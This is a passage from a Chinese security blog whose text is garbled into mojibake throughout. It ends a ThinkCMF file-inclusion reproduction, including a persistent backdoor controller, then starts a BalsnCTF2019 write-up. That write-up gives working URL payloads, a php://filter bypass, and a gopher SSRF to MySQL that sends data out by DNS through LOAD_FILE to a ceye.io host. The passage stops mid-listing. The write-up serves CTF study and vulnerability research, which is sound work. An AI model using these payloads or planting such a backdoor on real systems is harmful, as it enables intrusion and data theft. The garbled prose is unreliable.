class="string">'prefix'</span>].md5($_content).C(<span class="string">'TMPL_CACHFILE_SUFFIX'</span>),$_data[<span class="string">'var'</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $tpl = Think::instance(<span class="string">'Think\\Template'</span>);</span><br><span class="line">            <span class="comment">// ç¼–è¯‘å¹¶åŠ è½½æ¨¡æ¿æ–‡ä»¶</span></span><br><span class="line">            $tpl-&gt;fetch($_content,$_data[<span class="string">'var'</span>],$_data[<span class="string">'prefix'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨è½½å…¥æ¨¡æ¿ç¼“å­˜æ–‡ä»¶ï¼Œå¹¶è¿›è¡Œinlcudeæ–‡ä»¶åŒ…å«ï¼Œæ‰§è¡Œæˆ‘ä»¬çš„phpä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Storage::load(C(<span class="string">'CACHE_PATH'</span>).$_data[<span class="string">'prefix'</span>].md5($_content).C(<span class="string">'TMPL_CACHFILE_SUFFIX'</span>),$_data[<span class="string">'var'</span>]);</span><br></pre></td></tr></table></figure>

<p>loadå‡½æ•°å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span><span class="params">($_filename,$vars=null)</span></span>&#123;</span><br><span class="line"> <span class="keyword">if</span>(!is_null($vars))&#123;</span><br><span class="line">extract($vars, EXTR_OVERWRITE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> $_filename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="è‡ªå®šä¹‰åé—¨"><a href="#è‡ªå®šä¹‰åé—¨" class="headerlink" title="è‡ªå®šä¹‰åé—¨"></a>è‡ªå®šä¹‰åé—¨</h3><p>è¿™æ ·çš„è‡ªå®šä¹‰åé—¨æ¯”è¾ƒæ–¹ä¾¿çš„ï¼Œè€Œä¸”è¿™ä¸ªç›´æ¥å»æ‹¿çš„æ˜¯Think\Controllerï¼Œå¹¶æ²¡æœ‰å»HomebaseController.class.phpæ‹¿displayï¼Œå¦‚æœç›´æ¥å»HomebaseControllerç±»å»æ‹¿displayä¼šå¹¶ä¸”ä¸åŠ ä»»ä½•å¤„ç†ç›´æ¥ä¼ å…¥contentå†…å®¹æ˜¯ä¼šç”±äºä¸»é¢˜ä¸å­˜åœ¨è€Œç›´æ¥æŠ¥é”™çš„ï¼Œä¸è¿‡æˆ‘ä»¬ç»™templateFileèµ‹ä¸ªå€¼å°±å¥½äº†ï¼Œæ¯”å¦‚Readme.mdæˆ–è€…index.phpä¹‹ç±»çš„ï¼Œæˆ‘ä¸Šé¢ä¹Ÿæœ‰å†™ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Portal</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoorController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">($content)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">parent</span>::display(<span class="string">''</span>, <span class="string">''</span>, <span class="string">''</span>,$content, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/KsW66x" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/27/KsW66x.md.png" alt="KsW66x.md.png"></a></p>
<h3 id="æ¼æ´é˜²å¾¡"><a href="#æ¼æ´é˜²å¾¡" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h3><p>å°†HomebaseControllerä¸­fetchå’Œdisplayä¸¤ä¸ªå‡½æ•°å±æ€§è®¾ç½®ä¸ºprotectedï¼Œä½¿å…¶ä¸å¯éšæ„é€šè¿‡aå‚æ•°è°ƒç”¨ã€‚</p>
<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><p><a href="https://xz.aliyun.com/t/6626" target="_blank" rel="noopener">https://xz.aliyun.com/t/6626</a></p>
<p><a href="https://www.anquanke.com/post/id/189712" target="_blank" rel="noopener">https://www.anquanke.com/post/id/189712</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/10/27/ThinkCMF%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" data-id="ckabsu38n0027kkvrgvvag1ff" class="article-share-link" data-share="baidu" data-title="ThinkCMFä»»æ„å†…å®¹åŒ…å«æ¼æ´å¤ç°åˆ†æ">Share</a>
      

      
        <a href="http://yoursite.com/2019/10/27/ThinkCMF%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Webå®‰å…¨</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-BalsnCTF2019-å·…å³°æå®¢å¤ç°" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/27/BalsnCTF2019-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time datetime="2019-10-27T08:43:18.000Z" itemprop="datePublished">2019-10-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/27/BalsnCTF2019-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0/">BalsnCTF2019+å·…å³°æå®¢å¤ç°</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>è¿™ä¸ªæ¯”èµ›æ˜¯åœ¨å›½åº†é‚£å‡ å¤©ä¸¾è¡Œçš„..é‚£å‡ å¤©å‘çƒ§äº†orz..ä¸è¿‡åæ¥å¬å¸ˆå‚…ä»¬è¯´é¢˜ç›®æŒºå¥½çš„ï¼Œæ‰€ä»¥æ¥å¤ç°ä¸€ä¸‹ã€‚</p>
<p>å·…å³°æå®¢çš„è¯æ˜¯å› ä¸ºå½“æ—¶æ²¡åšå‡ºæ¥ï¼Œæ‰€ä»¥æ¥å¤ç°ä¸€ä¸‹ã€‚</p>
<h3 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h3><p>æ„Ÿè§‰æ˜¯ä¸€é“å¾ˆæœ‰è¶£çš„é¢˜äº†ï¼Œä¸è¿‡å¼€å§‹æ•´ç†ä»£ç æ ¼å¼â€¦.å’Œé‚£ä¸€å †é¢œæ–‡å­—çœ‹çš„çœŸæ˜¯å¤´ç–¼â€¦</p>
<p>æˆ‘ç›´æ¥çœ‹çš„tr1pleå¸ˆå‚…æ•´ç†å¥½çš„ä»£ç 233,ä»£ç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (($secret = base64_decode(str_rot13(<span class="string">"CTygMlOmpz"</span> . <span class="string">"Z9VaSkYzcjMJpvCt=="</span>)))</span><br><span class="line">    &amp;&amp; highlight_file(<span class="keyword">__FILE__</span>)</span><br><span class="line">    &amp;&amp; (<span class="keyword">include</span>(<span class="string">"config.php"</span>))</span><br><span class="line">    &amp;&amp; ($op = @$_GET[<span class="string">'op'</span>])</span><br><span class="line">    &amp;&amp; (@strlen($op) &lt; <span class="number">3</span> &amp;&amp; @($op + <span class="number">8</span>) &lt; <span class="string">'A_A'</span>)) &#123;</span><br><span class="line">    $_ = @$_GET[<span class="string">'Î£&gt;â€•(#Â°Ï‰Â°#)â™¡â†’'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00-!\'0-9"`&amp;$.,|^[&#123;_zdxfegavpos\x7F]+/i'</span>, $_)</span><br><span class="line">        || @strlen(count_chars(strtolower($_), <span class="number">3</span>)) &gt; <span class="number">13</span></span><br><span class="line">        || @strlen($_) &gt; <span class="number">19</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>($secret);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    @curl_setopt(</span><br><span class="line">        $ch,</span><br><span class="line">        CURLOPT_URL,</span><br><span class="line">        str_repLace(</span><br><span class="line">            <span class="string">"int"</span>,</span><br><span class="line">            <span class="string">":DD"</span>,</span><br><span class="line">            str_repLace(</span><br><span class="line">                <span class="string">"%69%6e%74"</span>, <span class="comment">//int</span></span><br><span class="line">                <span class="string">"XDDD"</span>,</span><br><span class="line">                str_repLace(</span><br><span class="line">                    <span class="string">"%2e%2e"</span>, <span class="comment">//..</span></span><br><span class="line">                    <span class="string">"Q___Q"</span>,</span><br><span class="line">                    str_repLace(</span><br><span class="line">                        <span class="string">".."</span>,</span><br><span class="line">                        <span class="string">"QAQ"</span>,</span><br><span class="line">                        str_repLace(</span><br><span class="line">                            <span class="string">"%33%33%61"</span>, <span class="comment">//33a</span></span><br><span class="line">                            <span class="string">"&gt;__&lt;"</span>,</span><br><span class="line">                            str_repLace(</span><br><span class="line">                                <span class="string">"%63%3a"</span>, <span class="comment">//c:</span></span><br><span class="line">                                <span class="string">"WTF"</span>,</span><br><span class="line">                                str_repLace(</span><br><span class="line">                                    <span class="string">"633a"</span>, </span><br><span class="line">                                    <span class="string">":)"</span>,</span><br><span class="line">                                    str_repLace(</span><br><span class="line">                                        <span class="string">"433a"</span>,</span><br><span class="line">                                        <span class="string">":("</span>,</span><br><span class="line">                                        str_repLace(</span><br><span class="line">                                            <span class="string">"\x63:"</span>,</span><br><span class="line">                                            <span class="string">"ggininder"</span>,</span><br><span class="line">                                            strtolower(<span class="keyword">eval</span>(<span class="string">"return $_;"</span>))</span><br><span class="line">                                        )</span><br><span class="line">                                    )</span><br><span class="line">                                )</span><br><span class="line">                            )</span><br><span class="line">                        )</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">    @curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">1</span>);</span><br><span class="line">    @curl_EXEC($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (@strlen($op) &lt; <span class="number">4</span> &amp;&amp; @($op + <span class="number">78</span>) &lt; <span class="string">'A__A'</span>) &#123;</span><br><span class="line">    $_ = @$_GET[<span class="string">''</span>];  <span class="comment"># \u2063</span></span><br><span class="line">    <span class="comment">//http://warmup.balsnctf.com/?%E2%81%A3=index.php%20&amp;op=-79</span></span><br><span class="line">    <span class="keyword">if</span> ((strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'.php'</span>)</span><br><span class="line">        || (strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'php.'</span>)</span><br><span class="line">        || (stripos($_, <span class="string">"\""</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        || (stripos($_, <span class="string">"\x3e"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        || (stripos($_, <span class="string">"\x3c"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        || (stripos(strtolower($_), <span class="string">"amp"</span>) !== <span class="keyword">FALSE</span>))</span><br><span class="line">        <span class="keyword">die</span>($secret);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($_, <span class="string">".."</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>($secret);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (stripos($_, <span class="string">"\x24"</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>($secret);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                print_r(substr(@file_get_contents($_), <span class="number">0</span>, <span class="number">155</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>($secret) &amp;&amp; system($_GET[<span class="number">0x9487945</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä»é¢˜ç›®æ¥çœ‹ï¼Œæœ‰ä¸‰æ¡è·¯</p>
<p><strong>é¦–å…ˆæ¥çœ‹ç¬¬ä¸€ä¸ªifæ¡ä»¶ï¼Œé™åˆ¶æ¡ä»¶å¦‚ä¸‹ï¼š</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/[\x00-!\'0-9"`&amp;$.,|^[&#123;_zdxfegavpos\x7F]+/i'</span>, $_)</span><br><span class="line">    || @strlen(count_chars(strtolower($_), <span class="number">3</span>)) &gt; <span class="number">13</span></span><br><span class="line">    || @strlen($_) &gt; <span class="number">19</span>) &#123;</span><br></pre></td></tr></table></figure>

<p>ç»å†è¿‡é™åˆ¶åï¼Œå†ç»è¿‡ä¸€å †replaceå</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl strtolower(eval(&quot;return $_;&quot;))</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆä¸æ˜¾ç¤ºcurlçš„ç»“æœï¼Œä¹Ÿå°±æ˜¯æ— å›æ˜¾çš„curl</p>
<p><strong>æ¥ä¸‹æ¥çœ‹else if</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (@strlen($op) &lt; <span class="number">4</span> &amp;&amp; @($op + <span class="number">78</span>) &lt; <span class="string">'A__A'</span>) &#123;</span><br><span class="line">   $_ = @$_GET[<span class="string">''</span>];  <span class="comment"># \u2063</span></span><br><span class="line">   <span class="comment">//http://warmup.balsnctf.com/?%E2%81%A3=index.php%20&amp;op=-79</span></span><br><span class="line">   <span class="keyword">if</span> ((strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'.php'</span>)</span><br><span class="line">       || (strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'php.'</span>)</span><br><span class="line">       || (stripos($_, <span class="string">"\""</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">       || (stripos($_, <span class="string">"\x3e"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">       || (stripos($_, <span class="string">"\x3c"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">       || (stripos(strtolower($_), <span class="string">"amp"</span>) !== <span class="keyword">FALSE</span>))</span><br><span class="line">       <span class="keyword">die</span>($secret);</span><br></pre></td></tr></table></figure>

<p>åˆæ˜¯ç»è¿‡ä¸Šé¢ä¸€å †è¿‡æ»¤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (stripos($_, <span class="string">".."</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>($secret);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($_, <span class="string">"\x24"</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>($secret);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            print_r(substr(@file_get_contents($_), <span class="number">0</span>, <span class="number">155</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€åé™åˆ¶äº†è·³è½¬ç›®å½•ï¼Œç„¶åé€šè¿‡file_get_contentså–å‡ºå›ºå®šé•¿åº¦çš„æ–‡ä»¶å†…å®¹ã€‚</p>
<p>è¿™é‡Œæœ‰ä¸¤æ¡è·¯å¯ä»¥èµ°ï¼Œæˆ‘ä»¬å…ˆçœ‹ç¬¬ä¸€ä¸ªçš„if</p>
<p>è¿‡æ»¤äº†<code>{[^</code>ï¼Œè¿™å°±è¯´æ˜äº†æˆ‘ä»¬æ— æ³•æ‹¿åˆ°$_GETä¹‹ç±»çš„shellï¼Œä¹Ÿä¸èƒ½é€šè¿‡å¼‚æˆ–æ‹¿åˆ°shellï¼Œä½†æ˜¯æ‹¬å·æ²¡è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å–åæ‹¿åˆ°å­—ç¬¦ï¼Œæ¯”å¦‚phpinfo()ï¼Œä»phpinfo()ä¸­å¯ä»¥çœ‹åˆ°å¾ˆå…³é”®çš„ä¸€ç‚¹ä¿¡æ¯ï¼Œè¿™æ˜¯ä¸ªwindowsçš„æœåŠ¡å™¨</p>
<p><img src="https://s2.ax1x.com/2019/10/25/KagH58.png" alt="KagH58.png"></p>
<p>çœ‹æ–‡ä»¶æ˜¯æœ‰è¿™ä¸ªconfig.phpæ˜¯è¢«åŒ…å«è¿›æ¥çš„ï¼Œè¿™ç§config.phpä¸€èˆ¬éƒ½ä¼šæœ‰æ•æ„Ÿä¿¡æ¯çš„</p>
<p>å¦‚æœç›´æ¥å»è¯»readfile(config.php)è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œä¸åŒçš„å­—ç¬¦è¶…è¿‡äº†åä¸‰ä¸ªï¼Œçœ‹åˆ°å›½å¤–å¤§ä½¬ç”¨çŸ­æ–‡ä»¶åå»è¯»æ–‡ä»¶å†…å®¹ï¼Œè†œ</p>
<p>Payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;warmup.balsnctf.com&#x2F;?%CE%A3%3E%E2%80%95(%23%C2%B0%CF%89%C2%B0%23)%E2%99%A1%E2%86%92&#x3D;%28%7E%8D%9A%9E%9B%99%96%93%9A%29%28%7E%9C%90%C3%C3%29&amp;op&#x3D;-9</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°æ–‡ä»¶å†…å®¹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// ***********************************</span></span><br><span class="line">    <span class="comment">// THIS IS THE CONFIG OF THE MYSQL DB</span></span><br><span class="line">    <span class="comment">// ***********************************</span></span><br><span class="line">    $host = <span class="string">"localhost"</span>;</span><br><span class="line">    $user = <span class="string">"admin"</span>;</span><br><span class="line">    $pass = <span class="string">""</span>;</span><br><span class="line">    $port = <span class="number">8787</span>;</span><br><span class="line">    <span class="comment">// hint:flag-is-in-the-database XDDDDDDD</span></span><br><span class="line">    <span class="comment">// ====================================</span></span><br><span class="line">    set_time_limit(<span class="number">1</span>);</span><br><span class="line">    ini_set(<span class="string">'mysql.connect_timeout'</span>,<span class="string">'1'</span>);</span><br><span class="line">    ini_set(<span class="string">'max_execution_time'</span>, <span class="string">'1'</span>);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç»™äº†ä¸€äº›Mysqlçš„é…ç½®ä¿¡æ¯ï¼Œå¹¶ä¸”å‘Šè¯‰äº†flagçš„ä½ç½®ï¼Œé‚£å°±æ˜¯gopheré…åˆcurlç›²æ‰“mysqläº†ã€‚</p>
<p><strong>åœ¨gopherä¹‹å‰ï¼Œæˆ‘ä»¬è¿˜å¾—è¯´ä¸€ä¸‹ç¬¬äºŒæ¡è·¯çš„è§£æ³•</strong></p>
<p>ä¸»è¦è¿‡æ»¤ä¸º</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'.php'</span>)</span><br><span class="line">    || (strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'php.'</span>)</span><br></pre></td></tr></table></figure>

<p>ç”±äºè¿™æ˜¯windowsæœåŠ¡å™¨ï¼Œè™½ç„¶ä»–è¿‡æ»¤äº†ä¸€ä¸ªphp.ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªphp+ç©ºæ ¼ï¼Œè¿™é‡Œé•¿åº¦çš„é—®é¢˜ï¼Œå¯ä»¥é€šè¿‡å‹ç¼©è§£å†³</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$content = file_get_contents(<span class="string">"http://warmup.balsnctf.com/?op=-99&amp;%E2%81%A3=php://filter/zlib.deflate/resource=config.php%20"</span>);</span><br><span class="line"></span><br><span class="line">$idx = stripos($content, <span class="string">"&lt;/code&gt;"</span>) + <span class="number">7</span>; <span class="comment">//codeåé¢çš„æ•°æ®å³ä¸ºå‹ç¼©æ•°æ®</span></span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">"/tmp/233"</span>, substr($content, $idx));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"php://filter/zlib.inflate/resource=/tmp/233"</span>);</span><br></pre></td></tr></table></figure>

<p><strong>å¯¹ä¸€ä¸ªæ¼æ´çš„åˆ©ç”¨è¿˜æ˜¯æœ‰å¾ˆå¤šç§çš„ï¼Œæ¯”å¦‚è¿™é‡Œåˆ©ç”¨windowså¯¹1.php.å’Œ1.phpç©ºæ ¼çš„å¤„ç†ï¼Œåœ¨è®¿é—®æˆ–è€…ä¸Šä¼ çš„æ—¶å€™ï¼Œéƒ½ä¼šå°†åé¢çš„ç¬¦å·åˆ é™¤è¿›è¡Œå¤„ç†</strong></p>
<p><strong>æœ€åæ¥ç€æ¥è¯´gopherç›²æ‰“mysql</strong></p>
<p>è¿™æ˜¯ä¸€ä¸ªæ²¡æœ‰å›æ˜¾çš„ssrf,ç›´æ¥æ”¾è¿›å»gopherçš„payloadè‚¯å®šæ”¾ä¸è¿›å»ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥å†å›åˆ°ä¹‹å‰çš„</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getenv(&quot;HTTP_T&quot;)</span><br></pre></td></tr></table></figure>

<p>ä¸è¿‡è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°åœ¨config.phpç§é™å®šäº†æ‰§è¡Œæ—¶é—´ï¼Œæ‰€ä»¥æ²¡æ³•ç›²æ³¨ï¼Œä¸è¿‡å¯ä»¥é€šè¿‡dnså¤–å¸¦æ‹¿åˆ°æ•°æ®</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(version()),&#39;.mysql.ztfjd8.ceye.io\\abc&#39;));</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡gopherç”Ÿæˆpayloadæ”¾åˆ°httpå¤´</p>
<p><img src="https://s2.ax1x.com/2019/10/25/Kaqt1I.png" alt="Kaqt1I.png"></p>
<p><img src="https://s2.ax1x.com/2019/10/25/KaqrNQ.png" alt="KaqrNQ.png"></p>
<p>æ¥ä¸‹æ¥æ‹¿flagçš„è¿‡ç¨‹ä¹Ÿå°±æ˜¯æ­£å¸¸çš„æ³¨å…¥è¿‡ç¨‹äº†ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯è§„é¿ç‰¹æ®Šç¬¦å·å’Œé•¿åº¦é™åˆ¶ï¼Œç‰¹æ®Šç¬¦å·å¯ä»¥ç”¨hexè§£å†³ï¼Œé•¿åº¦é™åˆ¶å¯ä»¥ç”¨substrè§£å†³ã€‚</p>
<h3 id="KoreaFish"><a href="#KoreaFish" class="headerlink" title="KoreaFish"></a>KoreaFish</h3><p>åŒæ ·æ˜¯å¾ˆæœ‰è¶£çš„é¢˜äº†ï¼Œphp+pythonçš„ä¸€ä¸ªwebï¼Œè€ƒç‚¹æ˜¯Dnsé‡ç»‘å®šæ”»å‡»ï¼ŒSSTIæ³¨å…¥</p>
<p>index.phpä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 